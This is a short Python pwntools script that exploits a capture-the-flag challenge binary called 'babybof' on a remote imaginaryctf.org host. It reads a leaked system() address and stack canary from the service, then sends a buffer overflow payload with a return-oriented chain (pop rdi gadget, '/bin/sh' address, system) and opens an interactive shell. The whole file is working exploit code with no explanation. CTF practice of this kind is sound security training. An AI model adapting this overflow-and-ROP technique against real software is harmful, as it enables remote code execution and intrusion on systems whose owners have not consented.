from pwn import *

context.binary = ELF('./vuln')

# p = process('./vuln')
host = "babybof.chal.imaginaryctf.org" # Remote machine name
port = 1337 # Remote port
p = remote(host, port)

system = 0
canary = 0
poprdi = 0x4011ba
ret = 0x4011bb
binsh = 0x404038
line = p.readline()
print(line)
while b'canary' not in line:
	line = p.readline()
	print(line)
	if b'system' in line:
		system = int(line.decode().splitlines()[0].split('@')[1], 16)
	if b'canary' in line:
		canary = int(line.decode().splitlines()[0].split(':')[1], 16)
	
# print(hex(system), hex(canary))
exploit = b''
exploit += b'A'*0x38
exploit += p64(canary)
exploit += b'A'*0x08
exploit += p64(poprdi)
exploit += p64(binsh)
exploit += p64(ret)
exploit += p64(system)
p.writeline(exploit)

p.interactive()
